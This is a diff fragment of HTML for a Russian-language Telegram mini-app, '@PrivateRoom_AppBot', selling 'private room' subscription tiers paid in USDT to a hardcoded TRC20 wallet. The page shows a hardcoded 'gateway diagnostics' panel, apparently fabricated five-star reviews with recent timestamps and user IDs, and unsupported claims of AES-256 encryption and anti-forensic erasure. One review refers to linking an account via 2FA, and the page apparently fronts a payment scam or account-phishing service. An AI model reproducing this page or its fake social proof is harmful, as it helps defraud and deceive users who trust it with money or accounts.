+                                    <span class="feat-icon text-neon">✓</span>
+                                    <span>Выделенный скоростной VPS-туннель</span>
+                                </div>
+                                <div class="compare-feat-item">
+                                    <span class="feat-icon text-neon">✓</span>
+                                    <span>Приоритетная генерация ключей</span>
+                                </div>
+                                <div class="compare-feat-item disabled">
+                                    <span class="feat-icon">✕</span>
+                                    <span>Искажение аудио и кружочков</span>
+                                </div>
+                            </div>
+                        </div>
+
+                        <!-- Column 3: VIP -->
+                        <div class="compare-card" id="compareVipCard">
+                            <div class="compare-header">
+                                <h3>Ghost VIP</h3>
+                                <div class="compare-price">
+                                    <span class="currency">$</span>
+                                    <span class="amount">110</span>
+                                    <span class="period">/ неделя</span>
+                                </div>
+                                <p class="compare-tagline">Бескомпромиссная анонимность и Ghost-модули</p>
+                                <button type="button" class="btn-compare-action btn-buy-trigger" data-plan="vip" data-price="110">
+                                    Купить Ghost VIP
+                                </button>
+                            </div>
+                            <div class="compare-features-list">
+                                <div class="compare-feat-item">
+                                    <span class="feat-icon text-neon">✓</span>
+                                    <span><strong>Все возможности</strong> тарифа Private PRO</span>
+                                </div>
+                                <div class="compare-feat-item">
+                                    <span class="feat-icon text-neon">✓</span>
+                                    <span><strong>Искажение тональности</strong> войсов и кружков</span>
+                                </div>
+                                <div class="compare-feat-item">
+                                    <span class="feat-icon text-neon">✓</span>
+                                    <span>Персональные Burner-ссылки</span>
+                                </div>
+                                <div class="compare-feat-item">
+                                    <span class="feat-icon text-neon">✓</span>
+                                    <span>Индивидуальный изолированный шлюз</span>
+                                </div>
+                                <div class="compare-feat-item">
+                                    <span class="feat-icon text-neon">✓</span>
+                                    <span>Anti-Forensic стирание метаданных</span>
+                                </div>
+                                <div class="compare-feat-item">
+                                    <span class="feat-icon text-neon">✓</span>
+                                    <span>Круглосуточный VIP саппорт 24/7</span>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- 5. GATEWAY DIAGNOSTICS & PING TEST -->
+                <div class="diagnostics-section">
+                    <div class="diag-card">
+                        <div class="diag-header">
+                            <div class="diag-icon">⚡</div>
+                            <div class="diag-text">
+                                <h4>Диагностика защищённого шлюза</h4>
+                                <p>Проверка шифрования и доступности кластера</p>
+                            </div>
+                        </div>
+
+                        <div class="diag-status-list" id="diagList">
+                            <div class="diag-row">
+                                <span>🔒 MTProto v2 E2E туннель:</span>
+                                <span class="diag-val text-green">Подключено (2040)</span>
+                            </div>
+                            <div class="diag-row">
+                                <span>🛡 VPS Relay Node (Germany):</span>
+                                <span class="diag-val text-green" id="diagPing">12 ms [OK]</span>
+                            </div>
+                            <div class="diag-row">
+                                <span>🧹 Zero-Trace Purge Engine:</span>
+                                <span class="diag-val text-green">Готов к работе</span>
+                            </div>
+                        </div>
+
+                        <button type="button" class="btn-diag-test" id="btnTestPing">
+                            <span>🔄 Выполнить тест задержки</span>
+                        </button>
+                    </div>
+                </div>
+
+                <!-- User Reviews Section -->
+                <div class="reviews-section">
+                    <div class="section-header">
+                        <span class="section-tag">Отзывы</span>
+                        <h2 class="section-title">Что говорят пользователи</h2>
+                        <div class="rating-badge">
+                            <span class="stars">★★★★★</span>
+                            <span class="rating-num">4.9 / 5.0 (более 1,400 сессий)</span>
+                        </div>
+                    </div>
+
+                    <div class="reviews-list">
+                        <!-- Review 1 -->
+                        <div class="review-card">
+                            <div class="review-top">
+                                <div class="reviewer-avatar av-crimson">AK</div>
+                                <div class="reviewer-info">
+                                    <div class="reviewer-title-row">
+                                        <span class="reviewer-name">Alexey K.</span>
+                                        <code class="reviewer-id-code">id: 729104812</code>
+                                    </div>
+                                    <span class="review-stars">★★★★★</span>
+                                </div>
+                                <span class="review-date">18 мин назад</span>
+                            </div>
+                            <p class="review-text">
+                                «Пользуюсь сервисом уже несколько недель для отправки закрытых рабочих документов и исходников. Очень удобно, что не требуется сторонний софт, всё работает напрямую через защищённый шлюз. Очистка сессии срабатывает безупречно.»
+                            </p>
+                        </div>
+
+                        <!-- Review 2 -->
+                        <div class="review-card">
+                            <div class="review-top">
+                                <div class="reviewer-avatar av-purple">VP</div>
+                                <div class="reviewer-info">
+                                    <div class="reviewer-title-row">
+                                        <span class="reviewer-name">Viktor P.</span>
+                                        <code class="reviewer-id-code">id: 610842915</code>
+                                    </div>
+                                    <span class="review-stars">★★★★★</span>
+                                </div>
+                                <span class="review-date">1 час назад</span>
+                            </div>
+                            <p class="review-text">
+                                «Искал стабильное решение для конфиденциальных диалогов без сохранения логов на стороне серверов. Привязка аккаунта заняла меньше минуты, задержек при передаче фото и файлов нет. Отличная реализация E2E защиты.»
+                            </p>
+                        </div>
+
+                        <!-- Review 3 -->
+                        <div class="review-card">
+                            <div class="review-top">
+                                <div class="reviewer-avatar av-emerald">SM</div>
+                                <div class="reviewer-info">
+                                    <div class="reviewer-title-row">
+                                        <span class="reviewer-name">Sofia M.</span>
+                                        <code class="reviewer-id-code">id: 591038419</code>
+                                    </div>
+                                    <span class="review-stars">★★★★★</span>
+                                </div>
+                                <span class="review-date">4 часа назад</span>
+                            </div>
+                            <p class="review-text">
+                                «Приятный и лаконичный интерфейс, всё интуитивно понятно. Главное преимущество — данные уничтожаются у обоих собеседников одновременно, никаких следов в облаке не остаётся.»
+                            </p>
+                        </div>
+
+                        <!-- Review 4 -->
+                        <div class="review-card">
+                            <div class="review-top">
+                                <div class="reviewer-avatar av-amber">AD</div>
+                                <div class="reviewer-info">
+                                    <div class="reviewer-title-row">
+                                        <span class="reviewer-name">Artem D.</span>
+                                        <code class="reviewer-id-code">id: 748201948</code>
+                                    </div>
+                                    <span class="review-stars">★★★★☆</span>
+                                </div>
+                                <span class="review-date">Вчера</span>
+                            </div>
+                            <p class="review-text">
+                                «Качественный инструмент для приватных задач. Тестировали с коллегами передачу тяжелых архивов — скорость высокая, шифрование отрабатывает штатно. Будет здорово, если добавите ещё искажение аудио.»
+                            </p>
+                        </div>
+
+                        <!-- Review 5 -->
+                        <div class="review-card">
+                            <div class="review-top">
+                                <div class="reviewer-avatar av-cyan">KV</div>
+                                <div class="reviewer-info">
+                                    <div class="reviewer-title-row">
+                                        <span class="reviewer-name">Kirill V.</span>
+                                        <code class="reviewer-id-code">id: 683920194</code>
+                                    </div>
+                                    <span class="review-stars">★★★★★</span>
+                                </div>
+                                <span class="review-date">Вчера</span>
+                            </div>
+                            <p class="review-text">
+                                «Всё работает строго по описанию. В часы пик генерация ключей комнаты может занять чуть больше времени, но уровень анонимности и отсутствие логов на дисках полностью это оправдывают.»
+                            </p>
+                        </div>
+
+                        <!-- Review 6 -->
+                        <div class="review-card">
+                            <div class="review-top">
+                                <div class="reviewer-avatar av-rose">ES</div>
+                                <div class="reviewer-info">
+                                    <div class="reviewer-title-row">
+                                        <span class="reviewer-name">Elena S.</span>
+                                        <code class="reviewer-id-code">id: 719482015</code>
+                                    </div>
+                                    <span class="review-stars">★★★★★</span>
+                                </div>
+                                <span class="review-date">2 дня назад</span>
+                            </div>
+                            <p class="review-text">
+                                «Отличный сервис для личных и деловых переписок. Процесс подключения через 2FA прошел без каких-либо сложностей. Спокойно обмениваюсь материалами, зная что сессия временная.»
+                            </p>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- FAQ Section -->
+                <div class="faq-section">
+                    <div class="section-header">
+                        <span class="section-tag">FAQ</span>
+                        <h2 class="section-title">Часто задаваемые вопросы</h2>
+                    </div>
+
+                    <div class="faq-accordion">
+                        <div class="faq-item">
+                            <button type="button" class="faq-question">
+                                <span>Как гарантируется удаление переписки?</span>
+                                <span class="faq-icon">+</span>
+                            </button>
+                            <div class="faq-answer">
+                                <p>Все сообщения и медиа обрабатываются исключительно в оперативной памяти изолированного шлюза. При закрытии комнаты криптографические ключи сбрасываются навсегда, делая восстановление данных невозможным.</p>
+                            </div>
+                        </div>
+
+                        <div class="faq-item">
+                            <button type="button" class="faq-question">
+                                <span>Сколько времени занимает создание комнаты?</span>
+                                <span class="faq-icon">+</span>
+                            </button>
+                            <div class="faq-answer">
+                                <p>Обычно генерация изолированного криптографического контура и выделение E2E шлюза занимает от 2 до 10 минут в зависимости от загрузки защищенных серверов.</p>
+                            </div>
+                        </div>
+
+                        <div class="faq-item">
+                            <button type="button" class="faq-question">
+                                <span>Доступны ли материалы третьим лицам или провайдеру?</span>
+                                <span class="faq-icon">+</span>
+                            </button>
+                            <div class="faq-answer">
+                                <p>Нет. Сквозное шифрование AES-256 и туннелирование через зарубежный VPS исключают перехват данных провайдерами, администраторами или сторонними сервисами.</p>
+                            </div>
+                        </div>
+
+                        <div class="faq-item">
+                            <button type="button" class="faq-question">
+                                <span>Нужно ли собеседнику также входить в шлюз?</span>
+                                <span class="faq-icon">+</span>
+                            </button>
+                            <div class="faq-answer">
+                                <p>После создания комнаты вы получаете защищённую ссылку-инвайт. Собеседник переходит по ней и подключается к изолированной сессии напрямую.</p>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="dashboard-footer-action">
+                    <button type="button" class="btn-secondary" id="btnDone">
+                        <span>Закрыть окно</span>
+                    </button>
+                </div>
+            </section>
+
+            <!-- TRC20 Payment Modal -->
+            <div class="payment-modal-backdrop hidden" id="paymentModalBackdrop">
+                <div class="payment-modal-card">
+                    <button type="button" class="modal-close-btn" id="btnPaymentClose">✕</button>
+                    
+                    <div class="payment-header">
+                        <div class="pay-crypto-badge">
+                            <span class="crypto-icon">₮</span>
+                            <span>USDT (TRC20 Network)</span>
+                        </div>
+                        <h3 id="payModalTitle">Оплата подписки Private PRO</h3>
+                        <p class="pay-modal-sub">Для активации переведите точную сумму на выделенный шлюз</p>
+                    </div>
+
+                    <div class="pay-body">
+                        <!-- Amount -->
+                        <div class="pay-field-box">
+                            <span class="pay-field-label">Сумма к переводу:</span>
+                            <div class="pay-amount-row">
+                                <span class="pay-amount-val" id="payModalAmount">50.00 USDT</span>
+                                <button type="button" class="btn-mini-copy" id="btnCopyAmount">
+                                    <span>Копировать</span>
+                                </button>
+                            </div>
+                        </div>
+
+                        <!-- Address -->
+                        <div class="pay-field-box">
+                            <span class="pay-field-label">Адрес кошелька (TRC20):</span>
+                            <div class="pay-address-wrap">
+                                <code class="pay-address-text" id="payModalAddress">TKTWwDCFyDrnk8H3wX7RxJFn4R11wYBqhX</code>
+                            </div>
+                            <button type="button" class="btn-copy-address" id="btnCopyAddress">
+                                <span>📋 Скопировать адрес</span>
+                            </button>
+                        </div>
+
+                        <!-- Notice -->
+                        <div class="pay-notice-box">
+                            <div class="pay-notice-icon">⚡</div>
+                            <div class="pay-notice-text">
+                                <strong>После перевода подписка активируется автоматически</strong>
+                                <p>Шлюз автоматически зафиксирует транзакцию в блокчейне TRON в течение 1–3 минут.</p>
+                            </div>
+                        </div>
+
+                        <!-- Status & Progress Loader -->
+                        <div class="pay-status-box">
+                            <div class="pay-loader-dot"></div>
+                            <span class="pay-status-text">Ожидание поступления транзакции в сети TRON...</span>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Notification Banner -->
+            <div id="toastNotification" class="toast hidden"></div>
+
+        </main>
+
+        <!-- Footer branding -->
+        <footer class="app-footer">
+            <span class="footer-tag">@PrivateRoom_AppBot</span>
+        </footer>
+    </div>
+
+    <script src="app.js"></script>
+</body>
+</html>
